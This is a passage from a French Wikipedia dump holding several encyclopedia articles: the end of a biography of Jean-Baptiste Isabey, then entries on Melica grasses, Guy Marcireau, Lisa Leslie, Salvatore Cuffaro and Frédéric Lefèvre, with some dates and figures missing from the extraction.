Bien qu'ayant été fidèle à Napoléon lors de son retour d'Elbe, il n'en est pas moins partie prenante à la Restauration. Il s'exile cependant en Angleterre au printemps 1816. Louis XVIII lui accorde le droit de publier ses lithographies du congrès de Vienne, et dans son petit hôtel particulier de la rue des Trois-Frères, il tient salon et donne des concerts de Cherubini, Boieldieu avec la chanteuse Sophie Gail. Il fait l'acteur et le clown ; la comtesse d'Abrantès témoigne : . En 1820, il voyage en Angleterre, puis en 1822 en Italie dont il tire des lithographies. En 1823, Louis XVIII le nomme dessinateur et ordonnateur des fêtes et spectacles de la Cour. En 1824, il agence le décor de la chapelle ardente pour les funérailles de Louis XVIII. Il est nommé par Charles X, dessinateur du cabinet du roi et organise, assisté de son gendre Cicéri, le couronnement de Reims. Il est promu officier de la Légion d'honneur.
Après la mort de sa femme en 1829, il épouse en secondes noces une élève, Eugénie Rose Maystre (1794-1857), avec qui il a deux enfants, Henri (1832-1835) et Henriette Augustine Eugénie (1837-1881).
En 1829, à la suite de la mort de sa première épouse, il quitte son hôtel particulier et s'installe rue Cadet chez sa nouvelle épouse puis, en 1834, s'installe au 25, quai de Conti dans un appartement de l'Académie, qui ne l'élit pas malgré trois tentatives. On lui attribue également un appartement au château de Versailles pour la belle saison, appartement qu'il conserve jusqu'à la fin de ses jours. La monarchie de Juillet lui confère le titre de conservateur adjoint des musées royaux auprès de François Marius Granet. Il pratique assidûment la lithographie et l'héliogravure en reproduisant ses modèles et dessins. Il apparaît sous le nom de « Isabey, père » dans le catalogue du Salon de 1841, où il présente un "Saint Jean" en section peinture.
Lors de la Deuxième République, il signe . Sous le Second Empire en 1852, le musée du Louvre lui consacre une salle pour ses dessins de costumes de l'Empire. Ces miniatures de Napoléon, Joséphine et de la cour sont largement reproduites en illustration de livres.
Napoléon III lui accorde une pension de pour celui qui fut le professeur de dessin de sa mère Hortense de Beauharnais, et lui remet la cravate de commandeur de la Légion d'honneur en 1854. Il fréquente le salon de la princesse Mathilde.
S'il peint jusqu'à ses 70 ans, il écrit sa biographie abrégée en 1843 puis renonce à peindre dans les dernières années.
Famille.
Il est le père d'Eugène Isabey, peintre de marine de l'école romantique. Sa fille aînée, Alexandrine, épouse le le peintre décorateur d'opéra et de théâtre Pierre-Luc-Charles Ciceri,
Jean-Baptiste Isabey est inhumé à Paris au cimetière du Père-Lachaise () aux côtés de sa première épouse Justine Laurisse de Salienne (1765-1829), ainsi que de sa seconde épouse Eugénie Rose Maystre (morte en 1857), de son fils Eugène (1803-1886) son fils et élève, et de son frère Louis Isabey (mort en 1813), musicien de la Chapelle du roi et premier violon de l'empereur de Russie.
Élèves.
Son atelier est représenté dans le célèbre tableau "Réunion d'artistes dans l'atelier d'Isabey" peint vers 1798 par Louis Léopold Boilly (Paris, musée du Louvre).
Certains de ses élèves deviennent des pionniers de la photographie après 1840.
Œuvre.
Jean-Baptiste Isabey représente en Europe l'excellence de l’école française de miniaturistes, une renommée acquise notamment par la qualité de ses ivoires peints à la gouache, en règle générale entourés de cadres précieux ou sertis dans des boîtes d’or. Il sut adapter cette technique et abandonner ce support au profit du papier vélin qui lui permit de vaporeux effets de ciel aquarellés. Ses miniatures sont également reproduites durant son vivant, puis par la suite pendant tout le , en décor de céramique, en gravure et en lithographie par lui-même ou au travers d'ateliers. François Aubertin fut l'un de ses premiers interprètes.
Une robe dessinée par Jean-Baptiste Isabey pour le sacre de Napoléon.
Au sacre de l'empereur, la comtesse Bérenger (1773-1828), épouse du Comte Jean Bérenger porte une robe dessinée par Isabey, comme toutes les tenues portées, ce jour-là, par les princes, princesses, ministres, sénateurs, conseillers d'État.
La robe est en tulle de soie ivoire, agrémentée de fines broderies métalliques et d'un double volant métallique au niveau de l'encolure. Les épaules sont soulignées par deux petits volants dentelés en tulle ivoire. Elle se ferme au dos au niveau de la poitrine, au moyen de deux liens coulissants. La traîne est en velours de soie rouge, ornée de broderies métallique dorée, avec un revers en satin blanc.
À part cette tenue des Bérenger, il n'existe plus dans le monde aucun vêtement du sacre de l'empereur. Cette robe et cette traîne de cour ont été présentées pour l'exposition "Les Trésors de la Fondation Napoléon. Dans l'intimité de la Cour impériale", qui s'est tenue pour le bicentenaire de la cérémonie, du au à Paris au musée Jacquemart-André à l'initiative de la Fondation Napoléon.
Depuis lors, elles sont régulièrement exposées dans divers musées en France et dans le reste du monde.
Réception critique.
Miniaturiste célébré de son vivant, ordonnateur des fêtes impériales et royales, Jean-Baptiste Isabey est souvent considéré comme un peintre mineur par rapport à la figure centrale de David. La miniature n'étant pas reconnue par l'Académie des beaux-arts, sa figure est rapidement éclipsée de son vivant par la figure majeure du romantisme et pré-impressionniste son fils Eugène Isabey et l'invention de la photographie . On le trouve souvent décrit comme Isabey père dans les dictionnaires et ventes du . D'autant que son gendre Pierre-Luc-Charles Ciceri devient une figure majeure du décor d'opéra et de théâtre, inventeur des dioramas avec Daguerre. En 1900, il est encore considéré comme le , mais Louis Gillet se doit de répondre dans son étude, de sa facilité, de sa versatilité politique, quand , si pour , qui publie son catalogue raisonné en 1909, il apparaît comme un . Pour Henri Bouchot, la reproduction systématique et discutable en atelier des miniatures du peintre par des élèves plus ou moins appliqués et doués, l'abus de voiles et de gazes sur les portraits féminins par Jean-Baptiste Isabey, redoublé du problème de l'insolation des miniatures qui apparaissent avoir des couleurs fanées avec le temps fondent les limites de l'œuvre et d'un jugement les concernant. Concernant ces dernières, il s'agit de copies, non signées de la main d'Isabey père comme l'explique La société d'histoire de la Lorraine et du musée Lorrain dans une de ses éditions, grâce à une lettre de son fils Eugène Isabey datée du 26 Avril 1882.

</doc>
<doc id="249058" url="https://fr.wikipedia.org/wiki?curid=249058" title="Mélique">
Mélique

La Mélique, Melica, est un genre de plantes herbacées de la famille des Poacées (graminées) qui comprend une quarantaine d'espèces des régions tempérées.

</doc>
<doc id="249059" url="https://fr.wikipedia.org/wiki?curid=249059" title="Panidae">
Panidae



</doc>
<doc id="249060" url="https://fr.wikipedia.org/wiki?curid=249060" title="Guy Marcireau">
Guy Marcireau

Guy Marcireau est un illustrateur et un dessinateur de bandes dessinées français du .
Biographie.
Professeur de dessin, Guy Marcireau réalise à partir de 1949 des récits complets pour les éditions Ray-Flo, en particulier "Sogor le Corsaire". En 1956, il illustre la série "Jean la Misère" dans le fascicule en couleurs "Arc en ciel" de la "Société Française de Presse Illustrée". Pour la même maison, il réalise des séries éphémères, en particulier "Morin le Fort" dans les numéros 1 à 16 de "Titan" en 1963 et 1964. En ce qui concerne la presse quotidienne, il fournit quatre séries au "Parisien Libéré" de 1960 à 1967. La plus longue (505 bandes en plusieurs épisodes non titrés) est "Monsieur Lecoq" d'après les romans d'Émile Gaboriau; elle est considérée par Henri Filippini, journaliste et historien de la bande dessinée, comme son travail le plus intéressant.
Après son ultime série, "Douce Amère", il semble ensuite avoir abandonné la bande dessinée. Ses séries diffusées par la petite agence « Les auteurs réunis » ont connu une faible diffusion en province.

</doc>
<doc id="249062" url="https://fr.wikipedia.org/wiki?curid=249062" title="Lisa Leslie">
Lisa Leslie

Lisa Leslie, née le à Gardena en Californie, est une joueuse américaine de basket-ball évoluant au poste de pivot. Elle est la première joueuse de basket-ball à avoir remporté quatre titres olympiques consécutifs et est considérée comme l'une des meilleures joueuses de l'histoire du Basket-ball féminin. Sa compatriote Teresa Edwards détient également quatre médailles d'or, mais obtenues sur six olympiades. Lisa Leslie est également triple championne du monde. 
Double championne de la Women's National Basketball Association (WNBA) avec les Sparks de Los Angeles, elle détient le plus grand nombre de titre de meilleure joueuse, trois ', tout comme ses compatriotes Sheryl Swoopes et A'ja Wilson et l'Australienne Lauren Jackson. Double meilleure joueuse des Finales WNBA, elle a remporté trois titres de ' des .
En 2015, elle est introduite au Basketball Hall of Fame. En 2022, elle intègre le FIBA Hall of Fame.
Biographie.
Les débuts.
Sa mère, qui mesure , élève seule Lisa et ses deux sœurs Dionne et Tiffany, grâce à son métier de camionneuse. Le père de Lisa les a quittés lors de l'enfance de celle-ci.
Lisa, qui a pour rêve de devenir présentatrice météo, rejoint le lycée ("") à Inglewood, à . Elle y évolue dans l'équipe de basket-ball, mais pratique d'autres sports comme le volley-ball ou l'athlétisme. Elle devient ainsi championne de l'état en triple saut et saut en hauteur. En basket-ball, elle conduit son équipe à deux titres de l'état. Sa performance la plus remarquable est un score de 101 points lors d'une seule mi-temps. Cela est dû à une tradition de son école qui consiste à donner tous les ballons à une seule et même joueuse lors de la dernière rencontre disputée à domicile. L'objectif est d'atteindre le record des 105 points de Cheryl Miller. À la mi-temps, Leslie totalise 101 points, avec 49 réalisés dans le premier quart temps et 52 dans le second. Mais le retrait de l'équipe adverse à la mi-temps la prive de record.
Elle rejoint ensuite l'équipe des Trojans d'USC de l'Université de Californie du Sud. Durant sa carrière universitaire, elle est nommée lors de ses trois dernières saisons. Bien que disputant le tournoi NCAA, elle ne peut franchir le niveau régional. Elle est nommée lors de son année junior, puis en 1994 lors de sa dernière année.
Carrière professionnelle.
À la suite de sa carrière universitaire, elle connait une première expérience en tant que professionnelle en évoluant en Italie, dans le club de Sicilgesso.
En 1996, le concept de Women's National Basketball Association (WNBA) est approuvé par la (NBA). Plus tard, Sheryl Swoopes et Rebecca Lobo sont les premières joueuses à rejoindre cette nouvelle ligue, suivies de peu par Ruthie Bolton, Lisa Leslie, Cynthia Cooper, Michele Timms. la WNBA s'appuie sur leur notoriété pour se développer et pouvoir lancer la saison inaugurale en 1997. 
La répartition des joueuses entre les huit franchises de cette première saison se fait lors de la Draft WNBA 1997. Lors de celle-ci, Lisa Leslie est choisie en septième position par les Sparks de Los Angeles. Bien que finissant deuxième de la Conférence Ouest, les Sparks ne disputent pas les playoffs, ceux-ci étant disputés par les quatre meilleurs bilans de la ligue lors de cette saison inaugurale. Lisa Leslie termine dans le premier cinq de la ligue. Sur le plan statistique, elle occupe la troisième place au niveau des points avec par rencontre, la première au niveau des rebonds, avec et la deuxième des contres avec par rencontre.
La saison suivante, elle termine à ces mêmes places mais en augmentant sa moyenne de points à et de rebonds avec . Lors de cette saison, elle figure dans le second cinq. Sa franchise, avec un bilan de 12 victoires pour 18 défaites, ne se qualifie pas pour la seconde année consécutive pour les playoffs.
Malgré des statistiques en baisse, , et , elle est nommée de nouveau dans le second cinq de la ligue lors de la saison WNBA 1999. Sa franchise dispute pour la première fois les playoffs. Lors du premier tour, Los Angeles élimine les Monarchs de Sacramento sur le score de 71 à 58 avant d'échouer en demi-finale face au double tenant du titre les Comets de Houston sur le score de 2 victoires à 1 (75-60, 55-83 et 62-72).
En 2000, elle retrouve une place dans le premier cinq de la ligue. Les Los Angeles Sparks terminent la phase régulière avec le meilleur bilan de la ligue, avec 28 victoires pour 4 défaites. Après un premier tour victorieux sur le Mercury de Phoenix, la franchise de Los Angeles échoue de nouveau en demi-finale face à Houston, sur le score de 2 à 0.
Lors de la saison suivante, les Sparks présentent le même bilan à l'issue de la phase régulière, puis battent pour la première fois Houston dans une série de playoff. Au second tour, les Sparks éliminent Sacramento par 2 victoires à 1 avant d'affronter le Sting de Charlotte en finale. Los Angeles l'emporte 75 à 66 lors de la première rencontre disputée à Charlotte avant de confirmer au Staples Center sur le score de 82 à 54. Les statistiques de Leslie en phase régulière, , et , progressent lors des playoffs avec , et . Elle est élue de la saison régulière, des finales. Elle est nommée du , devenant ainsi la première joueuse à obtenir ces trois récompenses lors de la même saison.
Lors de la saison suivante, elle inscrit de nouveau son nom dans l'histoire de la WNBA en devenant la première joueuse à franchir la barre des . Puis, le , elle devient la première joueuse à réaliser un dunk lors d'une rencontre de la ligue. Elle n'est toutefois pas la première basketteuse à réaliser ce geste: la joueuse de West Virginia, Georgeann Wells a réalisé cet exploit en NCAA en . Lors de la phase régulière, terminée sur un bilan de 25 victoires pour 7 défaites, elle termine avec deux statistiques en double chiffre, avec et , ce qu'elle n'avait plus réalisé depuis 1998. Une seule autre joueuse, Chamique Holdsclaw, réalise cette performance durant cette saison. Ces statistiques la placent au deuxième rang des rebondeuses et des contreuses et au cinquième des marqueuses. Lors des playoffs, les Sparks se défont du Storm de Seattle, du Starzz de l'Utah et du Liberty de New York en finales sur le score de deux victoires à zéro. Lors de ces playoffs, Leslie fait à nouveau progresser sa moyenne de points, de contres et de passes décisives. Pour la seconde année consécutive, elle remporte les deux titres de des Finales et du All Star Game. Elle est toutefois dépossédée par Sheryl Swoopes du titre de de la saison régulière. 
Lors de la saison 2003, elle ne dispute que 23 rencontres de la phase régulière en raison de blessures. Les Sparks terminent avec un bilan de 24 victoires pour 10 défaites. Pour la troisième saison consécutive, les Sparks atteignent les finales WNBA, après deux premiers tours remportés par deux victoires à une face au Lynx du Minnesota et aux Monarchs de Sacramento. Les Sparks remportent la première rencontre de la finale face au Shock de Détroit sur le score de 75 à 63 avant de perdre les deux dernières rencontres sur le score de 62 à 61 et 83 à 78. Malgré des statistiques légèrement en hausse par rapport à la saison précédente, elle est devancée par l'Australienne Lauren Jackson.
En 2004, elle réalise son premier triple-double en WNBA lors d'une rencontre contre Detroit avec , et . Elle est la troisième joueuse à réaliser cette performance après Sheryl Swoopes en 1999 (Points, rebonds, passes décisives) et la Polonaise Małgorzata Dydek en 2001 (points, rebonds et contres). Avec 425 points contre 351, elle devance Lauren Jackson pour le titre de de la phase régulière, récompense qu'elle obtient pour la seconde fois. Elle termine également pour la cinquième fois consécutive dans le meilleur cinq de la ligue et est élue meilleure défenseur de la ligue. Elle occupe le premier rang dans les catégories statistiques du rebond, avec et du contre, . Ses la placent en cinquième place des marqueuses. Durant cette même saison, le , elle est devenue la première à franchir la barre des en WNBA.
En 2005, et pour la première fois depuis 1999, les Sparks de Los Angeles ne terminent pas en tête de la Conférence Ouest à l'issue de la phase régulière. La franchise présente un bilan de pour . Lors des playoffs, les Sparks s'inclinent face aux Monarchs de Sacramento en deux manches. Avec des statistiques en baisse, (septième rang), (seconde place) et (quatrième), elle ne figure que dans le second cinq de la saison. 
À l'issue de cette saison, Leslie se laisse tenter par une seconde expérience européenne et rejoint la Superligue de Russie dans le club du Spartak région de Moscou. Elle contribue, avec et , à la victoire de son club en Eurocoupe .
Avec un bilan de 25-9, les Sparks retrouvent le premier rang de la Conférence Ouest la saison suivante. Lors du premier tour des playoffs, Los Angeles se défait du Storm de Seattle de Lauren Jackson par deux victoires à une (défaite 84 à 72 à Seattle, victoire 78 à 70 puis 68 à 62 au Stapples Center). Lors du tour suivant, Les Monarchs de Sacramento l'emportent 64 à 61 puis 72 à 58. Lisa Leslie, avec , et remportent son troisième titre de de la saison régulière. Elle est également nommée dans le premier cinq et dans le premier cinq défensif (). le , elle est devenue la première à franchir les lors d’un match contre les Silver Stars de San Antonio, match au cours duquel elle a inscrit (record personnel) et pris 13 rebonds. Le , elle figure dans la aux côtés de Sue Bird, Tamika Catchings, Cynthia Cooper, Yolanda Griffith, Lauren Jackson, Katie Smith, Dawn Staley, Sheryl Swoopes et Tina Thompson.
Après une année 2007 consacrée à la naissance de son premier enfant, elle retrouve les Sparks lors de la saison 2008. Celles-ci terminent au troisième rang de la conférence Ouest, puis franchissent le premier tour des playoffs grâce à une série victorieuse sur le score de 2 à 1 sur les Seattle Storm. En finale de Conférence, la franchise de Los Angeles échoue face aux Silver Stars de San Antonio en trois manches, 76 à 72 lors de la manche décisive. Pour la seconde année consécutive, Lisa Leslie est nommée dans le premier cinq et le premier cinq défensif de la ligue. Elle est également nommée .
le , Lisa Leslie, qui figure parmi les quatre joueuses qui ont joué la saison inaugurale de WNBA à être toujours en activité, annonce son retrait à l'issue de la saison 2009. Lors de celle-ci, elle inscrit un nouveau record en devenant la première à atteindre le . Los Angeles se défait de Seattle au premier tour des playoffs par deux victoires à une avant de s'incliner en finale de conférence face à Phoenix en trois manches, 95 à 74 lors de la manche décisive. Pour sa dernière rencontre, Leslie marque et prend .
Avec en de phase régulière, elle quitte la WNBA meilleure marqueuse de l’histoire de cette ligue, soit une moyenne de 17,3 points par rencontre, avec également , meilleur total à son départ de la ligue, pour une moyenne de 9,1. Elle totalise également 52 rencontres de playoff, pour des moyennes de 17,5 points et 9,1 rebonds.
En 2010, les Sparks retirent son numéro, . Elle est la seconde joueuse de la franchise à recevoir cet honneur, après Penny Toler.
Son record de en saison régulière WNBA n'est battu que le par Tamika Catchings.
Sélection nationale.
Sa carrière en équipe nationale débute en 1989 avec l'équipe junior pour disputer les championnats du monde. Deux ans plus tard, elle conduit son équipe à la victoire aux jeux Universitaires.
Après avoir participé à la préparation de l'équipe américaine pour les Jeux olympiques de 1992 à Barcelone, elle devient un des éléments de l'équipe des États-Unis, marquant et prenant lors des qualifications pour le Championnat du monde 1994. Lors de cette compétition, la sélection américaine termine à la troisième place, battue en demi-finale par le futur vainqueur de la compétition, le Brésil, sur le score de 110 à 107. Les statistiques de Lisa Leslie sur le tournoi sont de et .
La préparation pour les prochains Jeux olympiques de 1996 disputés à Atlanta débute en 1995. Durant celle-ci, la sélection américaine dispute 52 rencontres, toutes victorieuses. L'équipe des États-Unis, composée d'anciennes déjà très titrées comme la double championne olympique Teresa Edwards et de jeunes joueuses, Dawn Staley, Sheryl Swoopes, ou Leslie, enchaîne ensuite par huit victoires lors des jeux. Leslie, qui remporte un premier titre olympique pour sa première participation termine la compétition avec , meilleure marqueuse de son équipe, et . Lors du quart de finale contre le Japon, elle réussit 35 points, la meilleure marque d'une Américaine lors d'une compétition olympique. En demi-finale, elle réussit 22 points, 13 rebonds et 3 passes face à l'Australie qui doit s'incliner sur le score de 93 à 61, avant de réussir 29 points, à 12 sur 14 aux tirs, lors de la finale remportée 111 à 87 face au Brésil. 
Leslie retrouve la sélection américaine lors de la préparation pour les Championnats du monde 1998 en Allemagne, ponctuée par un bilan de 12 victoires sur 13 rencontres. Lors du mondial, la sélection remporte ses six rencontres des deux premiers tours, puis élimine la Slovaquie en quart, avant de battre les tenantes du titre les Brésiliennes en demi-finale. En finale, les Américaines battent les Russes sur le score de 72 à 57. Lisa Leslie termine de nouveau meilleure réalisatrice de son équipe avec par rencontre, et ajoute également .
La sélection américaine, qui a pour ambition de conserver son titre olympique lors de Jeux olympiques de 2000 à Sydney effectue de nouveau une longue préparation durant la saison 1999-2000, préparation qui se conclut par un bilan de 38 victoires pour deux défaites. Durant cette préparation, elle participe à 37 rencontres et apporte . La finale, qui oppose les Américaines aux Australiennes, voit la première confrontation en compétition officielle entre Leslie et Lauren Jackson, qui débuta en WNBA l'année suivante. Les Américaines remportent la finale sur le score de 76 à 54, Lisa Leslie marquant 15 points et prenant 9 rebonds.
Les États-Unis continuent de dominer le basket-ball féminin mondial en remportant le Championnat du monde 2002 en Chine, en restant de nouveau invaincu durant la compétition. Les Américaines battent les Australiennes en demi-finale avant d'affronter comme lors de l'édition précédente les Russes. Celles-ci sont battues sur le score de 79 à 74. Lisa Leslie termine à la quatrième place des marqueuses avec et à la troisième des rebondeuses, avec . Elle est également élue de la compétition.
Durant les Jeux olympiques de 2004 à Athènes, les Américaines remportent leur troisième titre olympique consécutif, le troisième de Staley, Swoopes et Leslie, en battant comme quatre ans auparavant l'Australie de Lauren Jackson. Lisa Leslie devient l'Américaine qui détient le plus grand nombre de points dans des rencontres olympiques, avec 407 points à l'issue de la compétition. Elle détient cette même première place au rebond, 185 et au contre, 25. Durant ce tournoi, elle a marqué et prit , ce qui la place respectivement à la huitième place et la cinquième place de la compétition.
Lisa Leslie décide, peu avant la compétition majeure suivante, le Championnat du monde 2006 disputé au Brésil, de ne pas y participer pour des raisons familiales: son oncle est paralysé à la suite d'un accident de voiture. En demi-finale, la Russie met fin à l'invincibilité américaine en grand championnat, invincibilité qui datait de 1994.
Elle retrouve la sélection pour sa quatrième participation aux Jeux olympiques. Cette sélection a pour objectif de reprendre sa domination sur le basket-ball féminin en remportant un quatrième titre olympique consécutif lors des Jeux de Pékin. Les États-Unis remportent aisément ses six rencontres du premier tour, le plus faible écart étant une victoire de 28 points face à l'Espagne. Après une victoire de 44 points face à la Corée du Sud, Leslie et ses coéquipières prennent leurs revanches sur la Russie sur le score de 67 à 52. L'affiche de la finale est alléchante, les championnes du monde en titre, l'Australie, défiant les tenantes du titre olympique. Mais elle ne tient pas ses promesses : les Américaines surclassent leurs rivales et l'emportent 92 à 65. Lisa Leslie apporte 14 points et 7 rebonds à son équipe. Malgré des statistiques en baisses sur le tournoi, elle termine une nouvelle compétition en double chiffre au niveau des points.
Durant sa carrière olympique, elle dispute , ne connaissant pas la défaite, et totalise , soit une moyenne de . En 2016, c'est le plus grand total détenu par une Américaine lors des jeux. Elle occupe cette même première place dans la statistique du rebond, avec 241 prises, soit par rencontre, et du contre, avec 36 soit par rencontre.
Palmarès.
Distinctions personnelles.
En 2002, elle est élue dans le premier cinq américain de tous les temps, en compagnie de Dawn Staley, Suzie McConnell, Katrina McClain et La'Keshia Frett. Ce classement a été établi en priorité en fonction des performances en , puis des carrières en et en professionnelle.
Vie privée.
Elle est mère de deux enfants, une fille née pendant sa carrière de joueuse et un fils né après.

</doc>
<doc id="249063" url="https://fr.wikipedia.org/wiki?curid=249063" title="Imladris">
Imladris



</doc>
<doc id="249064" url="https://fr.wikipedia.org/wiki?curid=249064" title="Fétichiste">
Fétichiste



</doc>
<doc id="249066" url="https://fr.wikipedia.org/wiki?curid=249066" title="Salvatore Cuffaro">
Salvatore Cuffaro

Salvatore Cuffaro (connu également avec le diminutif Totò), né à Raffadali (AG) le , est un homme politique italien.
Homme du centre-droit sicilien, ancien membre de la Démocratie chrétienne puis de l'Union des démocrates chrétiens (UDC), il est président de la Région sicilienne du à , premier à être élu (et réélu) au scrutin direct.
Ses liens avec la mafia sicilienne ont été confirmés par une condamnation définitive à sept ans de prison.
Ascension politique.
Docteur en médecine et chirurgie, Salvatore Cuffaro est radiologue.
Membre des mouvements catholiques à l'Université, adhérent depuis sa jeunesse à la Démocratie chrétienne, il participe à la victoire du mouvement étudiant de la DC lors des élections universitaires de 1978 à Palerme sous la supervision de Nino Gullotti et siège de 1980 à 1985 au conseil municipal de Raffadali dont il est le chef du groupe d'opposition de la DC.
Il se rapproche de Calogero Mannino lorsque celui-ci est nommé avec Sergio Mattarella par Ciriaco De Mita aux commandes de la DC sicilienne lors du congrès d'Agrigente en 1983, marquant la reprise du parti par l'aile gauche. Protégé par Mannino, il échoue à entrer au conseil municipal de Palerme de 1985 avec 4800 voix, mais construit discrètement son réseau. Aux municipales de 1990, avec 20 000 voix, il est le deuxième conseiller palermitain le mieux élu derrière Leoluca Orlando.
En 1991, il est élu à l'Assemblée régionale sicilienne dans le collège de Palerme, fort de 79 970 voix portées sur son nom. En plein scandale des Tangentopoli, Cuffaro intègre la commission de l'Agriculture.
Réélu pour la législature (1996-2001) avec 16 mille voix sur les listes CDU, il entre dans la junte régionale de Giuseppe Provenzano, n’obtenant pas l'assessorat à la Santé comme espéré, mais celui à l'Agriculture et aux forêts qu'il conserve dans les cinq gouvernements successifs de centre gauche comme de centre droit (Provenzano, Drago, Capodicasa I et II, Leanza II). Il est l'un des responsables de la chute du gouvernement Drago en soutenant avec son parti l'accession à la présidence de la région de l'ancien communiste Angelo Capodicasa, premier homme de gauche élu à ce poste, puis provoque sa démission en retirant l'appui de l'UDEUR en 2000.
Président de la Région sicilienne et sénateur.
Il mène la liste de la Maison des libertés (CDL) de Silvio Berlusconi, unissant le centre-droit et la droite sicilienne lors des élections régionales de 2001, première à désigner le président de la région au suffrage direct. Il recueille, le 24 juin, 59,1 % des votes contre 36,6 % au candidat du centre gauche et de la gauche, Leoluca Orlando, et 4,3 % à Sergio D'Antoni (Démocratie européenne). Il prend ses fonctions le 
De par l'élection directe, il renforce le lien entre le président et ses assesseurs. Il cultive une pratique du pouvoir que les médias nomment , fondé sur une importante assise électorale, un clientélisme local et un habile entregent politique.
Il est élu dans les rangs de l'Union de centre lors des élections européennes de 2004, mais préfère conserver son poste en Sicile. 
Soupçonné d'avoir négocié un pot-de-vin de 5 milliards de lires (environ 2,5 millions d'euros) auprès de la mafia contre l'implantation d'un centre commercial et d'avoir informé des chefs mafieux qu'ils étaient sous écoutes judiciaires, Salvatore Cuffaro s'est toujours déclaré innocent et se refuse à démissionner tant qu'il n'est pas condamné. Il est réélu en 2006 avec 53,09 % des suffrages face à Rita Borsellino (41,64 %) et Nello Musumeci (5,27 %). Il est élu sénateur en 2006, mais se démet pour cause d'incompatibilité avec le mandat de président de région. 
Après avoir tenté de rester en poste, il doit démissionner le 26 janvier 2008 après sa condamnation à cinq ans de prison pour avoir averti des membres de Cosa nostra qu'ils étaient sur écoutes.
En mars 2008, il est élu sénateur. Il démissionne en 2011, quand il a été arrêté après avoir perdu son dernier appel dans le procès de la mafia pour complicité mafieuse en cours de mandat. Cuffaro a été condamne à 7 années de prison et à l'interdiction perpétuelle des charges publiques.
Il conserve, malgré sa condamnation, son influence en Sicile pour les nominations politiques.
Des liens mafieux à la condamnation définitive.
En 2005, fut initié le procès contre Cuffaro par rapport aux « actes en faveur » de l'organisation criminelle de Cosa Nostra. La cour de Palerme estime qu'il a fait bénéficier des chefs mafieux d'informations sensibles et confidentielles protégées par le secret de l'instruction sur des enquêtes les concernant. Salvatore Cuffaro s'est initialement déclaré innocent et se refusait à se démettre tant qu'il n'était pas condamné de manière définitive. Il annonce sa démission de tous ses mandats en à la suite de la confirmation de sa condamnation en appel.
L'inculpation de Cuffaro est ressortie des investigations mises en place pour suivre les fuites au cours d'une enquête sur Giuseppe Guttadauro, "boss" de Cosa Nostra dans son fief de Palerme. Brancaccio. Guttadauro a été enregistré décrivant comment la mafia a financé la campagne électorale 2001 de Cuffaro. Selon les transcriptions, il a dit que Cuffaro a reçu des paquets d'argent "de la façon la moins élégante, mais la plus tangible possible".
Le Salvatore Cuffaro est "définitivement condamné" à sept ans de réclusion criminelle pour avoir favorisé Cosa nostra et pour avoir révélé des informations confidentielles, il est aussi condamné à une interdiction perpétuelle des charges publiques. Cuffaro fut détenu dans la prison romaine de Rebibbia. Étant déchu comme sénateur, il a été remplacé par Maria Pia Castiglione.
Il a purgé sa peine et a été libéré le à 2015.
Retour en politique.
Malgré son Inéligibilité, il revient dans la vie publique en 2020, avec la mission de lancer le nouveau parti Démocratie chrétienne, et de créer une école politique.
Lors des élections municipales de 2022 à Palerme, il soutient Roberto Lagalla qui prend la tête, après plusieurs semaines de négociations, de la coalition de centre-droit au sein de laquelle il présente une liste qui obtient 5,55 %, Ce succès est complété par les 6,61 % des suffrages que son parti récolte à Aci Catena et les 9,51 % à Niscemi avec Noi con Italia, de Maurizio Lupi, alors qu'il ne représente que 1,70 % des voix à Messine.

</doc>
<doc id="249068" url="https://fr.wikipedia.org/wiki?curid=249068" title="Frédéric Lefèvre">
Frédéric Lefèvre

Frédéric Lefèvre, né "Narcisse" Lefèvre le à Izé et mort à Paris le , est un romancier, essayiste et critique littéraire français.
Biographie.
Origine.
Fils de hongreur-rebouteux, que l'on disait aussi sorcier, il est né à Izé au pied du mont Rochard, pas très loin de la maison des Cheurin. Issue du monde rural, il était fils de paysan et fut, une partie de son enfance, berger. Orphelin à 5 ans, il put faire ses études grâce à un prêtre qui s’intéressa à lui et qui lui apprit le latin et le grec et lui donna le goût des lettres. Entré au petit séminaire de Mayenne, où il fut toujours dépaysé, de la troisième à la rhétorique. Il refusa ensuite d'entrer au grand séminaire de Laval.
Montée à Paris.
Frédéric Lefèvre s'en vint à Paris vers 1912 pour tenter fortune dans les lettres. Les premières années sont difficiles. Lefèvre connait un moment de célébrité ephémère en étant champion du concours de pipe pendant trois ans, fumant une pipe de quatre grammes en cinquante-six minutes et six secondes .
Par nécessité, pour vivre, il est « pion », professeur, secrétaire d’une usine de câbles électriques, employé de banque, clerc d’huissier ; il fait la Première Guerre mondiale, et c’est à Verdun qu’il écrivit son premier livre. Revenu de la guerre, il continua, publia divers essais. Il débuta avant 1914 par un essai sur la jeune poésie française et un second essai intitulé "Le Mépris sauveur".
L'adopté de Montmartre.
Frédéric Lefèvre est actif dans l'animation de la vie culturelle de la Butte Montmartre, et lance également avec Jules Depaquit et Maurice Hallé la "Foire aux croûtes" pour soutenir les nombreux artistes de la Butte.
Après la Première Guerre mondiale, il fréquente longuement les milieux monmartrois, où il se lie avec Francis Carco, Charles-Louis Philippe, Pierre Mac Orlan, Roland Dorgelès. Il collabore à de nombreuses revues littéraires et appartient à un moment à l'équipe des Treize de "L'Intransigeant".
Il participe en 1920 à "La Vache enragée", le journal des poètes que dirigeait Maurice Hallé, journal officiel de la Commune libre de Montmartre. Il y donnait, ou plutôt y parlait chaque soir un feuilleton dans lequel il évoquait Nietzsche, Wagner et bien d’autres personnages aussi célèbres.
Il collabora aussi à "L'Homme libre" et au "Cri de la Banlieue".
Nouvelles Littéraires.
Il participe, avec Maurice Martin du Gard et Jacques Guenne, à la fondation des "Nouvelles Littéraires" en octobre 1922. Il sera rédacteur en chef de cet hebdomadaire consacré à la littérature de 1922 à 1949. 
Entre-temps, Lefèvre voyagea beaucoup à travers l’Europe, pour donner un peu partout des conférences sur le mouvement intellectuel français. Il a la haine de la guerre, depuis longtemps, il réclame les États-Unis d’Europe, et il travaille opiniâtrement à l’échange et au rapprochement intellectuel international, et s'oppose aux réactionnaires.
Une heure avec....
C'est dans les pages des "Nouvelles littéraires" qu'il publia sa chronique « "Une Heure avec... », " forme nouvelle de la critique littéraire (reprenant ainsi l'idée de Jules Huret). Il inaugure le sa fameuse rubrique « Une heure avec... » en interrogeant le romancier Pierre Mille.
Cette série d′entretiens va prolonger jusqu′en 1938 avec près de 300 entretiens. Elle est aussi prolongée par une formule radiophonique sur Radio-Paris, nommée "Radio-Dialogues", qui sera menée jusqu'en 1940.
Littérature.
